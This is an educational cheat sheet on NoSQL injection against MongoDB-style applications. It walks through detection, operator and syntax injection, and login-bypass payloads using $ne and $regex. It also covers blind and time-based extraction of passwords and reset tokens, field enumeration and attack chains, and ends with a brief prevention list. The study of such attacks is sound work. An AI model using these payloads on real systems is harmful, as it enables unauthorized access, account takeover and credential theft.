# NoSQL Injection

NoSQL Injection (NoSQLi) is a web security vulnerability that allows an attacker to interfere with queries made to a NoSQL database.

By manipulating user-controlled input, attackers can alter query logic, bypass authentication mechanisms, retrieve sensitive information, enumerate database structures, and potentially gain unauthorized access to application functionality.

Unlike SQL Injection, which targets SQL statements, NoSQL Injection targets:

```text
JSON Queries

Database Operators

JavaScript Expressions

Query Logic
```

Common affected databases:

```text
MongoDB

CouchDB

Redis

DynamoDB

Cassandra
```

---

# Detection

The goal of detection is to determine whether user-controlled input influences database query behavior.

Unlike SQL Injection, NoSQL Injection often does not produce obvious database errors.

Indicators include:

```text
Authentication Bypass

Unexpected Results

Response Differences

Timing Delays

Data Disclosure
```

---

## Syntax Testing

Inject special characters and observe application behavior.

Examples:

```text
'

"

{

}

[

]

||

&&
```

### Why This Works

Many NoSQL applications dynamically build queries using user input.

Example:

Application receives:

```json
{
  "category":"fizzy"
}
```

Backend builds:

```javascript
this.category == 'fizzy'
```

If user input is inserted directly into the query, special characters may alter query execution.

### What To Look For

```text
Application Errors

Unexpected Search Results

Authentication Changes

Different Response Lengths

Different Result Counts
```

---

## Boolean Testing

Inject conditions that evaluate differently.

True Condition:

```text
' && 1 && '
```

False Condition:

```text
' && 0 && '
```

### Why This Works

If the application evaluates user input as query logic:

```javascript
this.category == 'fizzy' && 1
```

returns normal results.

While:

```javascript
this.category == 'fizzy' && 0
```

returns no results.

### What To Compare

```text
Response Length

Returned Results

Status Codes

Application Behavior
```

Differences indicate injected logic is being evaluated.

---

## Operator Testing

Applications often expect values:

```json
{
  "username":"admin"
}
```

Try injecting operators:

```json
{
  "username":{
    "$ne":""
  }
}
```

### Why This Works

Instead of:

```javascript
username = "admin"
```

MongoDB evaluates:

```javascript
username != ""
```

The attacker changes query logic rather than query data.

### Common Targets

```text
Login

Search

Filters

Profile Lookup

User Enumeration
```

---

## Timing Testing

Useful when no visible response differences exist.

Examples:

```javascript
sleep(5000)
```

```javascript
while(true){}
```

### Indicators

```text
Response Delays

Execution Time Changes

Consistent Timing Differences
```

---

# NoSQL Injection Types

---

## 1. Syntax Injection

Syntax Injection occurs when attacker input modifies the structure of a query.

### Example

Original Query:

```javascript
this.category == 'fizzy'
```

Payload:

```text
'||1==1||
```

Result:

```javascript
this.category == 'fizzy'||1==1
```

### Why It Works

The database interprets part of the user input as executable logic.

Instead of searching for:

```text
fizzy
```

the query becomes:

```text
Return All Records
```

because:

```javascript
1==1
```

always evaluates true.

### Impact

```text
Data Disclosure

Filter Bypass

Business Logic Manipulation

Authentication Bypass
```

---

## 2. Operator Injection

Operator Injection occurs when attackers inject MongoDB operators into queries.

### Example

Application expects:

```json
{
  "username":"admin"
}
```

Attacker sends:

```json
{
  "username":{
    "$ne":""
  }
}
```

### Why It Works

MongoDB treats:

```json
{
  "$ne":""
}
```

as an instruction.

Not as data.

Instead of:

```javascript
username = "admin"
```

MongoDB evaluates:

```javascript
username != ""
```

### Impact

```text
Authentication Bypass

User Enumeration

Data Extraction

Privilege Escalation
```

---

# Common MongoDB Operators

Most NoSQL Injection attacks abuse MongoDB operators.

---

## `$ne` (Not Equal)

Matches values that are not equal to the supplied value.

Example:

```json
{
  "$ne":""
}
```

Meaning:

```text
Match every value that is not empty
```

### Why Attackers Use It

Applications expect:

```javascript
username = "admin"
```

Injected query becomes:

```javascript
username != ""
```

Instead of searching for a specific user, MongoDB matches almost every user.

### Common Uses

```text
Authentication Bypass

User Enumeration

Filter Manipulation
```

---

## `$in`

Matches values contained within a list.

Example:

```json
{
  "$in":["admin","administrator"]
}
```

Meaning:

```text
Match:

admin

administrator
```

### Why Attackers Use It

Instead of searching for one value, attackers force MongoDB to search for multiple values.

Useful for:

```text
User Discovery

Role Discovery

Authentication Testing
```

---

## `$regex`

Allows pattern matching using regular expressions.

Example:

```json
{
  "$regex":"admin.*"
}
```

Matches:

```text
admin

administrator

admin123
```

### Why Attackers Use It

Applications typically require exact matches.

Example:

```javascript
username = "admin"
```

Using `$regex`, attackers replace exact matching with pattern matching.

This is useful for:

```text
Username Enumeration

Administrator Discovery

Authentication Bypass

Blind Extraction
```

---

## `$where`

Allows MongoDB to evaluate JavaScript expressions.

Example:

```javascript
{
 "$where":"this.username=='admin'"
}
```

### Understanding `this`

Inside a `$where` query:

```javascript
this
```

represents the current document.

Example:

```json
{
  "username":"admin",
  "password":"secret123"
}
```

For this document:

```javascript
this.username
```

becomes:

```javascript
admin
```

### Why It Is Dangerous

Unlike:

```text
$ne

$in

$regex
```

which only compare values, `$where` executes logic.

Attackers can:

```text
Compare Characters

Check Lengths

Extract Data

Enumerate Fields

Perform Timing Attacks
```

### Example

```javascript
{
 "$where":"this.password.length < 10"
}
```

MongoDB evaluates:

```text
Is password length less than 10?
```

The response reveals information about the password.

---

# Authentication Bypass

Authentication functionality is one of the most common NoSQL Injection targets.

Example Login Request:

```json
{
  "username":"wiener",
  "password":"peter"
}
```

Application Query:

```javascript
db.users.findOne({
  username:"wiener",
  password:"peter"
})
```

---

## Generic Authentication Bypass

Payload:

```json
{
  "username":{
    "$ne":""
  },
  "password":{
    "$ne":""
  }
}
```

### How It Works

Instead of checking:

```javascript
username = supplied_username

password = supplied_password
```

MongoDB evaluates:

```javascript
username != ""

password != ""
```

The query matches the first valid account.

### Impact

```text
Authentication Bypass

Account Takeover
```

---

## Targeted Authentication Bypass

Payload:

```json
{
  "username":{
    "$regex":"admin.*"
  },
  "password":{
    "$ne":""
  }
}
```

### How It Works

MongoDB searches for:

```text
Accounts beginning with admin
```

while bypassing password validation.

### Impact

```text
Administrative Access

Privilege Escalation
```

---

# NoSQL Injection in Search and Filters

Search functionality frequently builds database queries using user input.

---

## Boolean Manipulation

False Condition:

```text
fizzy' && 0 && 'x
```

Result:

```javascript
this.category == 'fizzy' && 0
```

Returns no results.

---

True Condition:

```text
fizzy' && 1 && 'x
```

Result:

```javascript
this.category == 'fizzy' && 1
```

Returns normal results.

### Why This Matters

Response differences indicate that injected conditions are being evaluated.

---

## Condition Override

Payload:

```text
fizzy'||'1'=='1
```

Result:

```javascript
this.category == 'fizzy'||'1'=='1'
```

### Why It Works

```javascript
'1'=='1'
```

always evaluates true.

The query may return all records.

### Impact

```text
Data Disclosure

Filter Bypass

Business Logic Manipulation
```

---

## Null Byte Injection

Payload:

```text
fizzy'%00
```

### Why It Works

The null byte may terminate processing.

Example:

```javascript
this.category == 'fizzy' &&
this.released == 1
```

becomes:

```javascript
this.category == 'fizzy'
```

Potentially bypassing filters.

---

# Blind NoSQL Injection

Blind NoSQL Injection occurs when query results are not directly visible.

Attackers infer information from application behavior.

---

## Boolean-Based Extraction

Payload:

```javascript
admin' && this.password[0]=='a'
```

MongoDB evaluates:

```text
Is the first password character equal to a?
```

If true:

```text
Normal Response
```

If false:

```text
Different Response
```

---

## Password Length Discovery

Payload:

```javascript
admin' && this.password.length < 30
```

### How It Works

MongoDB evaluates:

```text
Is password length less than 30?
```

By adjusting the value, attackers determine the exact length.

---

## Character Extraction

Payload:

```javascript
admin' && this.password[0]=='a'
```

Repeat for:

```text
password[0]

password[1]

password[2]
```

until the value is recovered.

### Common Targets

```text
Passwords

Reset Tokens

API Keys

JWT Secrets

Access Tokens
```

---

# Field Enumeration

Field Enumeration identifies document structure before extraction.

---

## Existing Field Detection

Payload:

```javascript
admin' && this.password!='
```

Compare with:

```javascript
admin' && this.randomfield!='
```

Response differences indicate whether a field exists.

---

## Object Key Enumeration

Payload:

```javascript
Object.keys(this)
```

Example Output:

```text
username

password

email

resetToken
```

### Why It Matters

Field names often reveal:

```text
Authentication Logic

Administrative Features

Secrets

Tokens
```

---

## Character-by-Character Enumeration

Payload:

```javascript
Object.keys(this)[0].match('^.{0}a.*')
```

Used to extract field names one character at a time.

---

# Time-Based NoSQL Injection

Used when responses appear identical.

---

## Delay-Based Testing

Payload:

```javascript
sleep(5000)
```

Observe:

```text
Response Delay
```

---

## Conditional Delays

Payload:

```javascript
if(this.password[0]=='a')
{
    sleep(5000)
}
```

If delayed:

```text
Condition True
```

Otherwise:

```text
Condition False
```

### Common Uses

```text
Blind Extraction

Password Extraction

Field Enumeration
```

---

# Attack Surface

Common NoSQL Injection targets:

```text
Login

Registration

Password Reset

Search

Filters

Reporting

REST APIs

GraphQL APIs

Mobile APIs

JSON Requests
```

---

# Real-World Testing Methodology

## Phase 1 — Recon

Identify:

```text
Login Endpoints

Search Features

Filters

JSON APIs

GraphQL APIs
```

---

## Phase 2 — Detection

Test:

```text
Syntax Injection

Boolean Injection

Operator Injection

Timing Injection
```

---

## Phase 3 — Authentication Testing

Attempt:

```text
$ne

$regex

$in
```

based bypasses.

---

## Phase 4 — Enumeration

Identify:

```text
Users

Fields

Tokens

Administrative Accounts
```

---

## Phase 5 — Data Extraction

Extract:

```text
Passwords

Reset Tokens

API Keys

Access Tokens
```

---

## Phase 6 — Escalation

Attempt:

```text
Account Takeover

Administrative Access

Privilege Escalation
```

---

# Attack Chains

## Administrative Access

```text
NoSQL Injection
        ↓
Authentication Bypass
        ↓
Admin Access
```

---

## Account Takeover

```text
NoSQL Injection
        ↓
Reset Token Extraction
        ↓
Password Reset
        ↓
Account Takeover
```

---

## Sensitive Data Disclosure

```text
NoSQL Injection
        ↓
Field Enumeration
        ↓
Credential Extraction
        ↓
Sensitive Data Access
```

---

## Privilege Escalation

```text
NoSQL Injection
        ↓
Admin Enumeration
        ↓
Credential Extraction
        ↓
Privilege Escalation
```

---

# Prevention

```text
Validate Input

Use Safe Query Construction

Disallow User-Controlled Operators

Use Allowlisted Fields

Disable Server-Side JavaScript

Enforce Least Privilege

Monitor Query Anomalies
```

---

